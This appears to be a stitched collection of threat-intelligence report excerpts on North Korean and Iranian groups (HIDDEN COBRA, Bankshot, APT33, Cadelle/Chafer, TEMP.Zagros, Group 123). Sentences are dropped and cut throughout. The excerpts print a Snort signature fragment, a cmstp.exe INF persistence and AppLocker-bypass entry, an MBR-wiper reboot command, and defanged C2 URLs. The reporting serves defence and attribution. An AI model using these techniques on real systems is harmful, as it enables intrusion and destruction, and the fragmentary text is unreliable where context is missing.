multiple vulnerabilities in these older systems provide cyber actors many targets for exploitation These actors have also used Adobe Flash player vulnerabilities to gain initial entry into users\u2019 environments.HIDDEN COBRA is known to use vulnerabilities affecting various applications The DeltaCharlie DDoS bot was originally reported by Novetta in their 2016 Operation Blockbuster Malware Report.[7] This malware has used the IP addresses identified in the accompanying .csv and .stix files as both source and destination IPs In some instances, the malware may have been present on victims\u2019 networks for a significant period.Technical DetailsDeltaCharlie is a DDoS tool used by HIDDEN COBRA actors, and is referenced and detailed in Novetta\u2019s Operation Blockbuster Destructive Malware report The information related to DeltaCharlie from the Operation Blockbuster Destructive Malware report should be viewed in conjunction with the IP addresses listed in the .csv and .stix files provided within this alert DeltaCharlie is a DDoS tool capable of launching Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Carrier Grade NAT (CGN) attacks Further details on the malware can be found in Novetta\u2019s report available at the following URL:https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdfDetection and ResponseHIDDEN COBRA IOCs related to DeltaCharlie are provided within the accompanying .csv and .stix files of this alert Upon reviewing the traffic from these IP addresses, system owners may find that some traffic corresponds to malicious activity and some to legitimate activity Although created using a comprehensive vetting process, the possibility of false positives always remains These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.Network Signaturesalert tcp any any -> any any (msg:\"DPRK_HIDDEN_COBRA_DDoS_HANDSHAKE_SUCCESS\"; dsize:6;

particularly if the compromise becomes public and sensitive information is exposed Possible impacts include:temporary or permanent loss of sensitive or proprietary information,disruption to regular operations,financial losses incurred to restore systems and files, andpotential harm to an organization\u2019s reputation Solution Mitigation StrategiesNetwork administrators are encouraged to apply the following recommendations, which can prevent as many as 85 percent of targeted cyber intrusions The mitigation strategies provided may seem like common sense However, many organizations fail to use these basic security measures, leaving their systems open to compromise:Patch applications and operating systems \u2013 Most attackers target vulnerable applications and operating systems Ensuring that applications and operating systems are patched with the latest updates greatly reduces the number of exploitable entry points available to an attacker Use best practices when updating software and patches by only downloading updates from authenticated vendor sites.Use application whitelisting \u2013 Whitelisting is one of the best security strategies because it allows only specified programs to run while blocking all others, including malicious software.Restrict administrative privileges \u2013 Threat actors are increasingly focused on gaining control of legitimate credentials, especially credentials associated with highly privileged accounts Reduce privileges to only those needed for a user\u2019s duties Separate administrators into privilege tiers with limited access to other tiers.Segment networks and segregate them into security zones \u2013 Segment networks into logical enclaves and restrict host-to-host communications paths This helps protect sensitive information and critical services, and limits damage from network perimeter breaches.Validate input \u2013 Input validation is a method of sanitizing untrusted input provided by users of a web application Implementing input validation can protect against the security flaws of web applications by significantly reducing the probability of successful exploitation Some anti-virus products can limit execution to only the highest reputation files, stopping a wide range of untrustworthy code from gaining control.Understand firewalls \u2013 Firewalls provide security to make your network less susceptible to attack They can be configured to block data and applications from certain locations (IP whitelisting), while allowing relevant and necessary data through.Response to Unauthorized Network AccessEnforce your security incident response and business continuity plan It may take time for your organization\u2019s IT professionals to isolate and remove threats to your systems and restore normal operations Meanwhile, you should take steps to maintain your organization\u2019s essential functions according to your business continuity plan Organizations should maintain and regularly test backup plans, disaster recovery plans, and business continuity procedures.Contact DHS or your local FBI office immediately Specifically, carefully consider which ports should be connecting outbound versus inbound.Enforce a strict lockout policy for network users and closely monitor logs for failed login activity References  Revisions   June 13, 2017: Initial Release August

Implant", "Retrieved May 07, 2019", "Article Content This post was prepared with contributions from Asheer Malhotra, Charles Crawford, and Jessica Saavedra-Morales.\u00a0 On February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations In this analysis, we observed the return of Hidden Cobra\u2019s Bankshot malware implant surfacing in the Turkish financial system Based on the code similarity, the victim\u2019s business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT In this new, aggressive campaign we see a return of the Bankshot implant, which last appeared in 2017 Bankshot is designed to persist on a victim\u2019s network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency The exploit, which takes advantage of CVE-2018-4878, allows an attacker to execute arbitrary code such as an implant the Further investigation into this campaign and analysis of McAfee product telemetry shows that the infection occurred on March 2 and 3 The implant\u2019s first target was a major government-controlled financial organization It next appeared in another Turkish government organization involved in finance and trade A further three large financial institutions in Turkey were victims of this attack The implant has so far not surfaced in any other sector or country This campaign suggests the attackers may plan a future heist against these targets by using Bankshot to gather information The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear These implants are variations of earlier forms of Bankshot, a remote access tool that gives an attacker full capability on a victim\u2019s system This implant also contains functionality to wipe files and content from the targeted system to erase evidence or perform other destructive actions Bankshot was first reported by the Department of Homeland Security on December 13, 2017, and has only recently resurfaced in newly compiled variants The sample we analyzed is 99% similar to the documented Bankshot variants from 2017 Bankshot implants hosted on falcancoin.io The Bankshot implant is attached to a malicious Word document with the filename Agreement.docx The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange The author of this document is test-pc It was created February 26 and was submitted from the Netherlands The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io We discovered two more documents, written in Korean, that exploit the same vulnerability as Agreement.docx These documents appear to be part of the same campaign and may have been used on different targets These documents also communicated with falcancoin.io to install Bankshot and also contain themes around cryptocurrency security Two Flash files exploit CVE-2018-4878 843c17b06a3aee22447f021307909890b68828b9 (February 25) 343ebca579bb888eb8ccb811f9b52280c72e484c (February 25  Malicious documents in the attack Malicious document exploiting CVE-2018-4878 The implants are downloaded via a Flash file embedded in the malicious document They are executed when the victim views the document The malicious site falcancoin.io embedded in the Flash file The implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites These URLs can be found hardcoded in the implants\u2019 code Hardcoded control server URLs Analyzing Bankshot The sample (a2e966edee45b30bb6bb5c978e55833eec169098) is a Windows DLL that serves as a backdoor and contains a variety of capabilities To mask itself, it can run as a regular library loaded into a legitimate process The malware begins by creating a new thread from the DllMain() function to carry out its malicious activities: New thread created in the malware\u2019s DllMain() function Based on analysis of previous samples, this is a unique identifier user_id is a hardcoded value in the malware binary that is sent to the control server filename is based on static analysis This looks like a specific beacon to indicate that the malware is ready to receive commands The command index calculator and jump to the appropriate command The process is identified by the control server sending the PID to the malware The capability to terminate a process Spawning arbitrary processes A process created as logged-in user This may be used to load additional downloaded components of the attack Loading an arbitrary library into its own process space.\u00a0 After every action is performed the malware sends a response to the control server indicating whether the action was successful Connections  The US government reports that Bankshot is used by Hidden Cobra to target multiple industries including financial organizations This implant has been connected to a major Korean bank attack and is also known as Trojan Manuscript That variant contained the capability to search for hosts related to the SWIFT network and the same control server strings as the variant we found targeting the Turkish financial sector The implant does not conduct financial transactions; rather it is a channel into the victim\u2019s environment, in which further stages of implants can be deployed for financial reconnaissance The Bankshot implant was also observed in 2017 in documents appearing to come from Latin American banks Malicious document delivering the Bankshot implant in 2017 These connections, combined with the implant\u2019s nearly identical appearance to known variants, are a strong indication that we have uncovered a Hidden Cobra attack Further, previous implants from 2017 contained bogus documents with financially themed content In this campaign, we see the adoption of a recent zero-day Adobe Flash vulnerability to get the implant onto the victim\u2019s systems The campaign has a high chance of success against victims who have an unpatched version of Flash Indicators of Compromise

07, 2019", "Article Content When discussing suspected Middle Eastern hacker groups with destructive capabilities, many automatically think of the suspected Iranian group that previously used SHAMOON \u2013 aka Disttrack \u2013 to target organizations in the Persian Gulf However, over the past few years, we have been tracking a separate, less widely known suspected Iranian group with potential destructive capabilities, whom we call APT33 Our analysis reveals that APT33 is a capable group that has carried out cyber espionage operations since at least 2013 We assess APT33 works at the behest of the Iranian government Recent investigations by FireEye\u2019s Mandiant incident response consultants combined with FireEye iSIGHT Threat Intelligence analysis have given us a more complete picture of APT33\u2019s operations, capabilities, and potential motivations This blog highlights some of our analysis Our detailed report on FireEye MySIGHT contains a more thorough review of our supporting evidence and analysis We will also be discussing this threat group further during our webinar on Sept 21 at 8 a.m ET Targeting APT33 has targeted organizations \u2013 spanning multiple industries \u2013 headquartered in the United States, Saudi Arabia and South Korea APT33 has shown particular interest in organizations in the aviation sector involved in both military and commercial capacities, as well as organizations in the energy sector with ties to petrochemical production From mid-2016 through early 2017, APT33 compromised a U.S organization in the aerospace sector and targeted a business conglomerate located in Saudi Arabia with aviation holdings During the same time period, APT33 also targeted a South Korean company involved in oil refining and petrochemicals More recently, in May 2017, APT33 appeared to target a Saudi organization and a South Korean business conglomerate using a malicious file that attempted to entice victims with job vacancies for a Saudi Arabian petrochemical company We assess the targeting of multiple companies with aviation-related partnerships to Saudi Arabia indicates that APT33 may possibly be looking to gain insights on Saudi Arabia\u2019s military aviation capabilities to enhance Iran\u2019s domestic aviation capabilities or to support Iran\u2019s military and strategic decision making vis a vis Saudi Arabia We believe the targeting of the Saudi organization may have been an attempt to gain insight into regional rivals, while the targeting of South Korean companies may be due to South Korea\u2019s recent partnerships with Iran\u2019s petrochemical industry as well as South Korea\u2019s relationships with Saudi petrochemical companies Iran has expressed interest in\u00a0growing their petrochemical industry and often posited this expansion in competition to Saudi petrochemical companies APT33 may have targeted these organizations as a result of Iran\u2019s desire to expand its own petrochemical production and improve its competitiveness within the region.\u00a0 The generalized targeting of organizations involved in energy and petrochemicals mirrors previously observed targeting by other suspected Iranian threat groups, indicating a common interest in the sectors across Iranian actors Figure 1 shows the global scope of APT33 targeting Figure 1: Scope of APT33 Targeting Spear Phishing APT33 sent spear phishing emails to employees whose jobs related to the aviation industry The .hta files contained job descriptions and links to legitimate job postings on popular employment websites that would be relevant to the targeted individuals An example .hta file excerpt is provided in Figure 2 To the user, the file would appear as benign references to legitimate job postings; however, unbeknownst to the user, the .hta file also contained embedded code that automatically downloaded a custom APT33 backdoor Many of the phishing emails appeared legitimate \u2013 they referenced a specific job opportunity and salary, provided a link to the spoofed company\u2019s employment website, and even included the spoofed company\u2019s Equal Opportunity hiring statement However, in a few cases, APT33 operators left in the default values of the shell\u2019s phishing module These appear to be mistakes, as minutes after sending the emails with the default values, APT33 sent emails to the same recipients with the default values removed As shown in Figure 3, the \u201cfake mail\u201d phishing module in the ALFA Shell contains default values, including the sender email address (solevisible@gmail[.]com), subject line (\u201cyour site hacked by me\u201d), and email body (\u201cHi Dear Admin\u201d) Figure 4: Example Email Generated by the ALFA Shell with Default Values Domain Masquerading APT33 registered multiple domains that masquerade as Saudi Arabian aviation companies and Western organizations that together have partnerships to provide training, maintenance and support for Saudi\u2019s military and commercial fleet Based on observed targeting patterns, APT33 likely used these domains in spear phishing emails to target victim organizations The following domains masquerade as these organizations: Boeing, Alsalam Aircraft Company, Northrop Grumman Aviation Arabia (NGAAKSA), and Vinnell Arabia boeing.servehttp[.]com    alsalam.ddns[.]net    ngaaksa.ddns[.]net    ngaaksa.sytes[.]net    vinnellarabia.myftp[.]org   Boeing, Alsalam Aircraft company, and Saudia Aerospace Engineering Industries entered into a joint venture to create the Saudi Rotorcraft Support Center in Saudi Arabia in 2015 with the goal of servicing Saudi Arabia\u2019s rotorcraft fleet and building a self-sustaining workforce in the Saudi aerospace supply base Alsalam Aircraft Company also offers military and commercial maintenance, technical support, and interior design and refurbishment services Two of the domains appeared to mimic Northrop Grumman joint ventures These joint ventures \u2013 Vinnell Arabia and Northrop Grumman Aviation Arabia \u2013 provide aviation support in the Middle East, specifically in Saudi Arabia Both Vinnell Arabia and Northrop Grumman Aviation Arabia have been involved in contracts to train Saudi Arabia\u2019s Ministry of National Guard Identified Persona Linked to Iranian Government We identified APT33 malware tied to an Iranian persona who may have been employed by the Iranian government to conduct cyber threat activity against its adversaries We assess an actor using the handle \u201cxman_1365_x\u201d may have been involved in the development and potential use of APT33\u2019s TURNEDUP backdoor due to the inclusion of the handle in the processing-debugging (PDB) paths of many of TURNEDUP samples An example can be seen in Figure 5 Figure 5: \u201cxman_1365_x\" PDB String in TURNEDUP Sample Xman_1365_x was also a community manager in the Barnamenevis Iranian programming and software engineering forum, and registered accounts in the well-known Iranian Shabgard and Ashiyane forums, though we did not find evidence to suggest that this actor was ever a formal member of the Shabgard or Ashiyane hacktivist groups Open source reporting links the \u201cxman_1365_x\u201d actor to the \u201cNasr Institute,\u201d which is purported to be equivalent to Iran\u2019s \u201ccyber army\u201d and controlled by the Iranian government Separately, additional evidence ties the \u201cNasr Institute\u201d to the 2011-2013 attacks on the financial industry, a series of denial of service attacks dubbed Operation Ababil In March 2016, the U.S Department of Justice unsealed an\u00a0indictment\u00a0that named two individuals allegedly hired by the Iranian government to build attack infrastructure and conduct distributed denial of service attacks in support of Operation Ababil While the individuals and the activity described in indictment are different than what is discussed in this report, it provides some evidence that individuals associated with the \u201cNasr Institute\u201d may have ties to the Iranian government Potential Ties to Destructive Capabilities and Comparisons with SHAMOON One of the droppers used by APT33, which we refer to as DROPSHOT, has been linked to the wiper malware SHAPESHIFT Open source research indicates SHAPESHIFT may have been used to target organizations in Saudi Arabia Although we have only directly observed APT33 use DROPSHOT to deliver the TURNEDUP backdoor, we have identified multiple DROPSHOT samples in the wild that drop SHAPESHIFT Both DROPSHOT and SHAPESHIFT contain Farsi language artifacts, which indicates they may have been developed by a Farsi language speaker (Farsi is the predominant and official language of Iran) While we have not directly observed APT33 use SHAPESHIFT or otherwise carry out destructive operations, APT33 is the only group that we have observed use the DROPSHOT dropper It is possible that DROPSHOT may be shared amongst Iran-based threat groups, but we do not have any evidence that this is the case In March 2017, Kasperksy released a report that compared DROPSHOT (which they call Stonedrill) with the most recent variant of SHAMOON (referred to as Shamoon 2.0) They stated that both wipers employ anti-emulation techniques and were used to target organizations in Saudi Arabia, but also mentioned several differences Kaspersky also noted the difference in resource language sections: SHAMOON embeds Arabic-Yemen language resources while DROPSHOT embeds Farsi (Persian) language resources We have also observed differences in both targeting and tactics, techniques and procedures (TTPs) associated with the group using SHAMOON and APT33 For example, we have observed SHAMOON being used to target government organizations in the Middle East, whereas APT33 has targeted several commercial organizations both in the Middle East and globally APT33 has also utilized a wide range of custom and publicly available tools during their operations In contrast, we have not observed the full lifecycle of operations associated with SHAMOON, in part due to the wiper removing artifacts of the earlier stages of the attack lifecycle Regardless of whether DROPSHOT is exclusive to APT33, both the malware and the threat activity appear to be distinct from the group using SHAMOON Therefore, we assess there may be multiple Iran-based threat groups capable of carrying out destructive operations Additional Ties Bolster Attribution to Iran APT33\u2019s targeting of organizations involved in aerospace and energy most closely aligns with nation-state interests, implying that the threat actor is most likely government sponsored This coupled with the timing of operations \u2013 which coincides with Iranian working hours \u2013 and the use of multiple Iranian hacker tools and name servers bolsters our assessment that APT33 may have operated on behalf of the Iranian government APT33 largely operated on days that correspond to Iran\u2019s workweek, Saturday to Wednesday This is evident by the lack of attacker activity on Thursday, as shown in Figure 6 Public sources report that Iran works a Saturday to Wednesday or Saturday to Thursday work week, with government offices closed on Thursday and some private businesses operating on a half day schedule on Thursday.\u00a0Many other Middle East countries have elected to have a Friday and Saturday weekend Iran is one of few countries that subscribes to a Saturday to Wednesday workweek APT33 leverages popular Iranian hacker tools and DNS servers used by other suspected Iranian threat groups The publicly available backdoors and tools utilized by APT33 \u2013 including NANOCORE, NETWIRE, and ALFA Shell \u2013 are all available on Iranian hacking websites, associated with Iranian hackers, and used by other suspected Iranian threat groups While not conclusive by itself, the use of publicly available Iranian hacking tools and popular Iranian hosting companies may be a result of APT33\u2019s familiarity with them and lends support to the assessment that APT33 may be based in Iran Figure 6: APT33 Interactive Commands by Day of Week Outlook and Implications Based on observed targeting, we believe APT33 engages in strategic espionage by targeting geographically diverse organizations across multiple industries Specifically, the targeting of organizations in the aerospace and energy sectors indicates that the threat group is likely in search of strategic intelligence capable of benefitting a government or military sponsor APT33\u2019s focus on aviation may indicate the group\u2019s desire to gain insight into regional military aviation capabilities to enhance Iran\u2019s aviation capabilities or to support Iran\u2019s military and strategic decision making Their targeting of multiple holding companies and organizations in the energy sectors align with Iranian national priorities for growth, especially as it relates to increasing petrochemical production We expect APT33 activity will continue to cover a broad scope of targeted entities, and may spread into other regions and sectors as Iranian interests dictate APT33\u2019s use of multiple custom backdoors suggests that they have access to some of their own development resources, with which they can support their operations, while also making use of publicly available tools The ties to SHAPESHIFT may suggest that APT33 engages in destructive operations or that they share tools or a developer with another Iran-based threat group that conducts destructive operations It is a full-featured backdoor with a plugin framework  Public    NETWIRE  Backdoor that attempts to steal credentials from the local machine from a variety of sources and supports other

Iran-based attackers have been using back door threats to conduct targeted surveillance of domestic and international targets While the groups are heavily targeting individuals located in Iran, they\u2019ve also compromised airlines and telecom providers in the Middle East region, possibly in an attempt to monitor targets\u2019 movements and communications The attackers are part of two separate groups that have a shared interest in targets One group, which we call Cadelle, uses Backdoor.Cadelspy, while the other, which we\u2019ve named Chafer, uses Backdoor.Remexi\u00a0and Backdoor.Remexi.B These threats are capable of opening a back door and stealing information from victims\u2019 computers The Cadelle and Chafer groups Symantec telemetry identified Cadelle and Chafer activity dating from as far back as July 2014, however, it\u2019s likely that activity began well before this date Command-and-control (C&C) registrant information points to activity possibly as early as 2011, while executable compilation times suggest early 2012 Their attacks continue to the present day Symantec estimates that each team is made up of between 5 and 10 people The back door threats that the groups use appear to be custom made It\u2019s unclear how Cadelle infects its targets with Backdoor.Cadelspy However, Chafer has been observed compromising web servers, likely through SQL injection attacks, to drop Backdoor.Remexi onto victims\u2019 computers Chafer then uses Remexi to gather user names and passwords to help it spread further across the network There is evidence to suggest that the two teams may be connected in some way, though we cannot confirm this A number of computers experienced both Cadelspy and Remexi infections within a small time window In one instance, a computer was compromised with Backdoor.Cadelspy just minutes after being infected with Backdoor.Remexi The Cadelle and Chafer groups also keep the same working hours and focus on similar targets However, no sharing of C&C infrastructure between the teams has been observed If Cadelle and Chafer are not directly linked, then they may be separately working for a single entity Their victim profile may be of interest to a nation state This suggests that the majority of victims are based in Iran There was also a significant amount of individual targets that used anonymous proxy services to go online Reports have shown that many Iranians avail of these services to access sites that are blocked by the government\u2019s internet censorship measures Dissidents, activists, and researchers in the region may use these proxies in an attempt to keep their online activities private Figure 1 Backdoor.Cadelspy infections by region In terms of targeted organizations, both Cadelle and Chafer seem to be interested in a similar category of organizations, such as airlines and telecom companies The affected organizations we were able to identify are mostly based in the Middle East region in countries such as Saudi Arabia and Afghanistan, while one organization is located in the US Figure 2 Number of unique organizations hit with Backdoor.Cadelspy and Backdoor.Remexi from July 2014 to October 2015 Our telemetry shows that among more than a dozen entities that experienced Cadelspy and Remexi infections, four of them were compromised with both of the threats at some stages In most instances, victim computers were infected with either Backdoor.Cadelspy or Backdoor.Remexi, not both Less than five percent of computers were infected with both malware families In one affected organization, there was intermittent activity between the threats over ten months A combined total of 60 computers were compromised in another organization for almost a year The malware\u2019s activity on victim computers appears to depend on the targets Other compromised computers included those belonging to web developers, or are file and database servers The nature of the victims suggests that Cadelle and Chafer are primarily interested in tracking individuals in terms of their movements and communications Compromising regional telcos and airlines can help the attackers achieve this aim Based in Iran? There are a number of factors in these groups\u2019 campaigns that suggests that the attackers may be based in Iran Figure 3 Cadelle and Chafer\u2019s activity levels by hour in Iran\u2019s time zone (UTC +3.5) Additionally, Symantec observed that Backdoor.Cadelspy\u2019s file strings seem to include dates written in the Solar Hijri calendar, which is used in Iran and Afghanistan While the Gregorian calendar marks the current year as 2015, the Solar Hijri calendar states that it is 1394 Based on our analysis, we believe that Cadelle and Chafer\u2019s victims are most likely to be of interest to an Iranian entity Cadelle and Chafer are by no means the first Iran-based attack group to appear Other groups attributed to Iranian attackers, such as Rocket Kitten, have targeted Iranian

Cadelle and Chafer are still active today and we don\u2019t expect to see them end their activities any time soon Individuals and organizations wishing to avoid being compromised by these teams should

Campaign", "Retrieved May 07, 2019", "Article Content Introduction From January 2018 to March 2018, through FireEye\u2019s Dynamic Threat Intelligence, we observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macro-based documents to individuals in Asia and the Middle East We attribute this activity to TEMP.Zagros (reported by Palo Alto Networks and Trend Micro as MuddyWater), an Iran-nexus actor that has been active since at least May 2017 This actor has engaged in prolific spear phishing of government and defense entities in Central and Southwest Asia When successfully executed, the malicious documents install a backdoor we track as POWERSTATS One of the more interesting observations during the analysis of these files was the re-use of the latest AppLocker bypass, and lateral movement techniques for the purpose of indirect code execution Campaign Timeline In this campaign, the threat actor\u2019s tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets A brief timeline of this activity is shown in Figure 1 Figure 1: Timeline of this recently observed spear phishing campaign The first part of the campaign (From Jan 23, 2018, to Feb 26, 2018) used a macro-based document that dropped a VBS file and an INI file The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe The process chain is shown in Figure 2 One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3 Figure 3: VBS invoking PowerShell via MSHTA The second part of the campaign (from Feb 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog Infection Vector We believe the infection vector for all of the attacks involved in this campaign are macro-based documents sent as an email attachment What follows is four examples, and a complete list is available in the Indicators of Compromise section at the end of the blog Figure 5 shows a document purporting to be from the National Assembly of Pakistan Figure 5: Document purporting to be from the National Assembly of Pakistan A document purporting to be from the Turkish Armed Forces, with content written in the Turkish language, is shown in Figure 6 Figure 6: Document purporting to be from the Turkish Armed Forces A document purporting to be from the Institute for Development and Research in Banking Technology (established by the Reserve Bank of India) is shown in Figure 7 Figure 7: Document purporting to be from the Institute for Development and Research in Banking Technology Figure 8 shows a document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of Tajikistan Figure 8: Document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of Tajikistan Each of these macro-based documents used similar techniques for code execution, persistence and communication with the command and control (C2) server The threat group in this recently observed campaign \u2013 TEMP.Zagros \u2013 weaponized their malware using the following techniques The macro in the Word document drops three files in a hard coded path: C:\\programdata Since the path is hard coded, the execution will only be observed in operating systems, Windows 7 and above DefenderService.inf \u2013 The INF file that is used to invoke the above scriptlet file After dropping the three files, the macro will set the following registry key to achieve persistence:  \\REGISTRY\\USER\\SID\\Software\\Microsoft\\Windows\\CurrentVersio \u00a0 \u00a0n\\Run\\\"WindowsDefenderUpdater\" = cmstp.exe /s c:\\programdata\\DefenderService.inf Upon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file This is possible because inside the INF file we have the following section: [UnRegisterOCXSection] %11%\\scrobj.dll,NI,c:/programdata/Defender.sct That section gets indirectly invoked through the DefaultInstall_SingleUser section of INF, as shown in Figure 9 Figure 9: Indirectly invoking SCT through the DefaultInstall_SingleUser section of INF This method of code execution is performed in an attempt to evade security products FireEye MVX and HX Endpoint Security technology successfully detect this code execution technique Figure 10: Character replacement and string reversing techniques   PowerShell Environment Variables: Nowadays, malware authors commonly mask critical strings such as \u201cIEX\u201d using environment variables The algorithm used for encryption and decryption is RSA, which leverages the public and private key exponents included in Section 1 of the PowerShell script Section 3 The third section of the PowerShell script is the biggest section and has a wide variety of functionalities During analysis, we observed a code section where a message written in Chinese and hard coded in the script will be printed in the case of an error while connecting to the C2 server:   The English translation for this message is: \u201cCannot connect to website, please wait for dragon\u201d Figure 16: Reboot, shut down and clean commands  Ability to sleep for a given number of seconds The following table summarizes the main C2 commands supported by this PowerShell

performed by an actor with multiple campaigns mainly linked to South Korean targets.Executive SummaryThis article exposes the malicious activities of Group 123 during 2017 We assess with high confidence that Group 123 was responsible for the following six campaigns:\"Golden Time\" campaign.\"Evil New Year\" campaign This campaign copies the approach of the 2017 \"Evil New Year\" campaign.The links between the different campaigns include shared code and compiler artifacts such as PDB (Program DataBase) patterns which were present throughout these campaigns.Based on our analysis, the \"Golden Time\", both \"Evil New Year\" and the \"North Korean Human Rights\" campaigns specifically targeted South Korean users Group 123 has been known to use exploits (such as CVE-2013-0808) or scripting languages harnessing OLE objects The purpose of the malicious documents was to install and to execute ROKRAT, a remote administration tool (RAT) On occasion the attackers directly included the ROKRAT payload in the malicious document and during other campaigns the attackers leveraged multi-stage infection processes: the document only contained a downloader designed to download ROKRAT from a compromised web server.Additionally, the \"FreeMilk\" campaign targeted several non-Korean financial institutions In this campaign, the attackers made use of a malicious Microsoft Office document, a deviation from their normal use of Hancom documents Group 123 used this vulnerability less than one month after its public disclosure During this campaign, the attackers used 2 different malicious binaries: PoohMilk and Freenki PoohMilk exists only to launch Freenki This malware was used in several campaigns in 2016 and has some code overlap with ROKRAT.Finally, we identified a 6th campaign that is also linked to Group 123 We named this 6th campaign \"Are You Happy?\" In this campaign, the attackers deployed a disk wiper The purpose of this attack was not only to gain access to the remote infected systems but to also wipe the first sectors of the device We identified that the wiper is a ROKRAT module.This actor was very active this year and continued to mainly focus on South Korea The group leveraged spear phishing campaigns and malicious documents the contents of which included very specific language suggesting that they were crafted by native Korean speakers rather than through the use of translation services To use HTTPS communications to make it harder to perform traffic analysis.To compromise third parties to forge realistic spear phishing campaigns (i.e Yonsei university in the \"Golden Time\" campaign) To constantly evolve, the new fileless capability included in 2018 is a proof.The TimelineHere is the timeline for 2017 and the beginning of 2018: August 2016 to March 2017: \"Golden Time\" CampaignAs with the majority of Group 123 campaigns, the initial attack vector during this campaign was spear phishing Talos identified two different kinds of emails The first email we discovered was the most interesting In this sample, we observed the attackers praising the user for joining a panel related to the \"Korean Reunification and North Korean Conference\" The text in the email explained that the recipient should complete the attached document to provide necessary feedback This appears to be a non-existent conference The closest match we identified related to any Unification conference was held in January 2017, which was the NYDA Reunification conference The sender was 'kgf2016@yonsei.ac.kr' which is the contact email of the Korea Global Forum, a separate conference We believe that the email address was compromised and abused by the attackers to send the email used in this campaign The filename for the malicious attachment translates as 'Unification North Korea Conference _ Examination Documents' which reinforces the text in the email about the reunification conference For an added bonus, in the body of the email, the attacker even suggests that people who completed the document would get paid a 'small fee' Perhaps the gift of embedded malware is the payment:Much less effort was used to craft the second email Talos analyzed The email was from a free Korean mail service provided by Daum, Hanmail, indicating that there was no attempt to try to appear as if it originated from an official body or person, unlike the previous email described The subject was simply 'Request Help' while the attachment filename was 'I'm a munchon person in Gangwon-do, North Korea' This vulnerability targets the EPS (Encapsulated PostScript) format The purpose of the shellcode is to download a payload from the Internet If Windows XP is detected, the malware executes an infinite loop The purpose is to generate empty reports if opened on sandbox systems running Windows XP machines If it detects the presence of these tools, the malware performs two network requests to legitimate websites:hxxps://www[.]amazon[.]com/Men-War-PC/dp/B001QZGVEC/EsoftTeam/watchcom.jpghxxp://www[.]hulu[.]com/watch/559035/episode3.mp4The Amazon URL displays a WWII game called 'Men of War' while the Hulu URL attempts to stream a Japanese anime show called 'Golden Time':One of the identifying characteristics of ROKRAT is the fact that it uses social network and cloud platforms to communicate with the attackers These platforms are used to exfiltrate documents and receive instructions In this campaign the actors tried to fool victims by pretending the emails were from the Korean Ministry of Unification and that they offered Korean-specific analysis Group123 further attempted to entice victims to open the attachments by using common Hancom Hangul documents Hancom's Hangul is a popular Office Suite used primarily in the Korean peninsula The use of Hangul office documents has the advantage of being the norm for the Korean peninsula If the attacker used Microsoft documents, it may have raised suspicions in the victim This is a simple choice for the actor to make, but it further shows their familiarity with the region The document claimed to discuss the New Year's activities of North Korea and this would have been something that the victims in South Korea would be very interested in This would have been particularly true for Government targets, who we believe to be Group123's target of choice This document was well written and further increases our confidence that we are dealing with a new Korean actor The shellcode is embedded within the resource 'BIN' and is used to unpack another PE32 binary and use wscript.exe to execute it To do this, Group123 uses a well-known technique that harnesses VirtualAllocEx(), WriteProcessMemory() and CreateRemoteThread() Windows API calls.The new PE32 unpacked from the shellcode is an initial reconnaissance malware which is used to communicate with the C2 infrastructure to obtain the final payload Further network analysis showed that the binary attempted to connect to the following URLs:www[.]kgls[.]or[.]kr/news2/news_dir/index.phpwww[.]kgls[.]or[.]kr/news2/news_dir/02BC6B26_put.jpgKorean Government Legal Services (KGLS) is a legitimate Korean government body that manages Korean government legal affairs By compromising the KGLS, the attacker gained a trusted platform from which to execute an attack.The initial network connection is to 'index.php' This connection transmits the information gathered during the reconnaissance phase The attacker uses this information to then determine the specific filename (based on the random ID) to serve to the infected victim In our case this was 02BC6B26 - this meant a file \"02BC6B26_put.jpg\" was created for us on the attackers C2 This file is then dropped and renamed 'officepatch.exe' on the victim's machine Because the attacker was careful about who they attacked, we were unable to obtain this file during our analysis.During our investigation we were able to identify additional Command and Control infrastructure used by this actor Four C2s were observed, based in the following countries:3 C2 in South Korea1 C2 in the NetherlandsHere is a global map of the identified infrastructure:Contrary to the previous campaign, the attackers separated the reconnaissance phase from the main ROKRAT payload This trick was likely used to avoid detection This is an interesting adaptation in Group 123's behavior.March 2017: \"Are You Happy?\" CampaignIn March 2017, Group 123 compiled a disk wiper The malware contains 1 function, the purpose is to open the drive of the infected system (\\\\.\\PhysicalDrive0) and write the following data to the MBR:You can see the \"Are you Happy?\" string in the written buffer After writing to the MBR, the malware reboots the machine with the following command: c:\\windows\\system32\\shutdown /r /t 1After the reboot, the MBR displays the following string to the user:The link to the other campaigns was the following PDB path:D:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdbAs you can see, it perfectly matches the ROKRAT PDB This wiper is a ROKRAT module named ERSP.enc We assume that ERSP means ERaSePartition This module can be downloaded and executed on demand by Group 123.This sample is interesting considering the attack in December 2014 against a Korean power plant where the message that was displayed by the wiper was \"Who Am I?\".May 2017: \"FreeMilk\" CampaignThis campaign targeted non-Korean financial institutions, but unlike the other campaigns, this one does not use HWP documents It instead uses Office documents The file is executed with the argument: \"help\" At the next reboot, the malware will be executed.The second 